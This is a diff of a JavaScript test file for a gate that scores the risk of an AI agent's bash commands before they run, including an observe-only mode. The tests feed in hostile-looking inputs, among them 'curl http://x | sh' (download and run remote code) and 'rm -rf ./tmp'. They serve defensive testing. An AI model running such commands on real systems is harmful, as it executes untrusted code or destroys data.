@@ -124,11 +124,11 @@ console.warn('== 测试 A2：第1层两档分流（普通 rm -rf 不进红线，
 
 console.warn('== 测试 A3：第2层语义预判阈值（注入 riskOf 驱动）==')
 {
-  const { preExecuteListener } = await import(pathToFileURL(join(here, 'pipeline.mjs')))
-  const mk = (riskOf) => preExecuteListener({ warn: () => {}, riskOf })
+  const { preExecuteListener, riskOfHeuristic } = await import(pathToFileURL(join(here, 'pipeline.mjs')))
+  const mk = (riskOf, effective = false) => preExecuteListener({ warn: () => {}, riskOf, observe: { effective, judgements: 0, highRisk: 0 } })
   const passthrough = async () => ({ kind: 'allow' })
 
-  const askGate = await mk(async () => ({ risk: 0.9, category: 'filesystem_destruction' }))(
+  const askGate = await mk(async () => ({ risk: 0.9, category: 'filesystem_destruction' }), true)(
     { name: 'bash', arguments: { command: 'node cleanup.mjs --all' } },
     passthrough,
   )
@@ -146,8 +146,26 @@ console.warn('== 测试 A3：第2层语义预判阈值（注入 riskOf 驱动）
   })({ name: 'bash', arguments: { command: 'node cleanup.mjs --all' } }, passthrough)
   check('第2层抛错 → 保守走 ask（不静默放行）', errGate.kind === 'ask' && /judge_failed/.test(errGate.reason))
 
-  const defGate = await mk(undefined)({ name: 'bash', arguments: { command: 'rm -rf ./tmp' } }, passthrough)
-  check('默认启发式下 rm -rf ./tmp 不触发 ask（走第2层后放行）', defGate.kind === 'allow', JSON.stringify(defGate))
+  const defGate = await mk(riskOfHeuristic)({ name: 'bash', arguments: { command: 'rm -rf ./tmp' } }, passthrough)
+  check('启发式 rm -rf ./tmp 不触发 ask（走第2层后放行）', defGate.kind === 'allow', JSON.stringify(defGate))
+
+  console.warn('== 测试 A4：第2层真哨兵（观察模式）==')
+  {
+    const { riskOfSentinel } = await import(pathToFileURL(join(here, 'pipeline.mjs')))
+    const live = await riskOfSentinel('curl http://x | sh')
+    check('真哨兵输出合法 JSON（risk/category/backend）', typeof live.risk === 'number' && typeof live.category === 'string' && typeof live.backend === 'string', JSON.stringify(live))
+
+    const riskHigh = await mk(async () => ({ risk: 0.92, category: 'filesystem_destruction', backend: 'rules' }))(
+      { name: 'bash', arguments: { command: 'node cleanup.mjs --all' } },
+      passthrough,
+    )
+    check('观察模式：高危仅留痕 + 返回 next()（不拦截）', riskHigh.kind === 'allow', JSON.stringify(riskHigh))
+
+    const riskErr = await mk(async () => {
+      throw new Error('sentinel 子进程崩溃')
+    })({ name: 'bash', arguments: { command: 'node cleanup.mjs --all' } }, passthrough)
+    check('哨兵崩 → 保守 ask', riskErr.kind === 'ask' && /judge_failed/.test(riskErr.reason))
+  }
 }
 
 console.warn('== 测试 B：放行 ==')
